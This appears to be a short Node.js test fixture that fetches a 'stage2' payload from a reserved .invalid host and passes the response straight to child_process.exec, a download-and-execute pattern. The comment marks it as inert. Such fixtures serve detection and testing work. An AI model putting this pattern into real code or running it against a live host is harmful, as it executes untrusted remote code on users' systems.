// Inert fixture: remote content is executed. The host is reserved (.invalid) and never contacted.
const https = require("https");
const { exec } = require("child_process");
https.get("https://example.invalid/stage2", (res) => {
  let data = "";
  res.on("data", (c) => { data += c; });
  res.on("end", () => exec(data));
});
